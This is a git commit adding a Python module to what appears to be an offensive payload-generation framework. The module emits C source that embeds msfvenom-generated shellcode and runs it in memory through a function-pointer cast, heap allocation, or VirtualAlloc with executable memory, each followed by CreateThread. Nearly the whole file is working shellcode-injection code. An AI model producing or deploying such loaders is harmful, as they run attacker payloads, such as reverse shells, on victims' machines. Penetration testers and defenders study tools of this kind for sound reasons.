b77fb71dfb2742d9a9ea02497820341e8a00cdc3
Christopher Truncer <chris@christophertruncer.com>
2014-06-14 09:39:50 -0400

    Added C payload containing all injection techniques

---
+++ modules/payloads/c/shellcode_inject/flatc.py
@@ -0,0 +1,95 @@
+"""
+
+C version of the VirtualAlloc pattern invoker.
+
+Code adapted from:
+http://www.debasish.in/2012/08/experiment-with-run-time.html
+
+
+module by @christruncer
+
+"""
+
+from modules.common import shellcode
+from modules.common import helpers
+
+class Payload:
+    
+    def __init__(self):
+        # required options
+        self.description = "C Combination of all Injection Methods w/no Obfuscation"
+        self.language = "c"
+        self.rating = "Poor"
+        self.extension = "c"
+
+        self.shellcode = shellcode.Shellcode()
+        # options we require user ineraction for- format is {Option : [Value, Description]]}
+        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
+                                 "inject_method" : ["Virtual", "Void, Virtual, or Heap"]}
+
+    def generate(self):
+        
+        # Generate Shellcode Using msfvenom
+        Shellcode = self.shellcode.generate()
+        
+        # Generate Random Variable Names
+        RandShellcode = helpers.randomString()
+        RandReverseShell = helpers.randomString()
+        RandMemoryShell = helpers.randomString()
+
+        if self.required_options["inject_method"][0].lower() == "void":
+
+            # Start creating our void pointer C payload
+            PayloadCode = 'unsigned char payload[]=\n'
+            PayloadCode += '\"' + Shellcode + '\";\n'
+            PayloadCode += 'int main(void) { ((void (*)())payload)();}\n'
+        
+            return PayloadCode
+
+        elif self.required_options["inject_method"][0].lower() == "heap":
+
+            # Create out heap injecting C payload
+            PayloadCode = '#include <windows.h>\n'
+            PayloadCode += '#include <stdio.h>\n'
+            PayloadCode += '#include <string.h>\n'
+            PayloadCode += 'int main()\n'
+            PayloadCode += '{\n'
+            PayloadCode += '    HANDLE heapVar;\n'
+            PayloadCode += '    LPVOID lpvAddr;\n'
+            PayloadCode += '    HANDLE hHand;\n'
+            PayloadCode += '    DWORD dwWaitResult;\n'
+            PayloadCode += '    DWORD threadID;\n\n'
+            PayloadCode += 'unsigned char buff[] = \n'
+            PayloadCode += '\"' + Shellcode + '\";\n\n'
+            PayloadCode += 'heapVar = HeapCreate(0x00040000, strlen(buff), 0);\n'
+            PayloadCode += 'lpvAddr = HeapAlloc(heapVar, 0x00000008, strlen(buff));\n'
+            PayloadCode += 'RtlMoveMemory(lpvAddr,buff, strlen(buff));\n'
+            PayloadCode += 'hHand = CreateThread(NULL,0,lpvAddr,NULL,0,&threadID);\n'
+            PayloadCode += 'dwWaitResult = WaitForSingleObject(hHand,INFINITE);\n'
+            PayloadCode += 'return 0;\n'
+            PayloadCode += '}\n'
+
+            return PayloadCode
+
+        else:
+
+            # Start creating our virtual alloc injecting C payload
+            PayloadCode = '#include <windows.h>\n'
+            PayloadCode += '#include <stdio.h>\n'
+            PayloadCode += '#include <string.h>\n'
+            PayloadCode += 'int main()\n'
+            PayloadCode += '{\n'
+            PayloadCode += '    LPVOID lpvAddr;\n'
+            PayloadCode += '    HANDLE hHand;\n'
+            PayloadCode += '    DWORD dwWaitResult;\n'
+            PayloadCode += '    DWORD threadID;\n\n'
+            PayloadCode += 'unsigned char buff[] = \n'
+            PayloadCode += '\"' + Shellcode + '\";\n\n'
+            PayloadCode += 'lpvAddr = VirtualAlloc(NULL, strlen(buff),0x3000,0x40);\n'
+            PayloadCode += 'RtlMoveMemory(lpvAddr,buff, strlen(buff));\n'
+            PayloadCode += 'hHand = CreateThread(NULL,0,lpvAddr,NULL,0,&threadID);\n'
+            PayloadCode += 'dwWaitResult = WaitForSingleObject(hHand,INFINITE);\n'
+            PayloadCode += 'return 0;\n'
+            PayloadCode += '}\n'
+
+            return PayloadCode
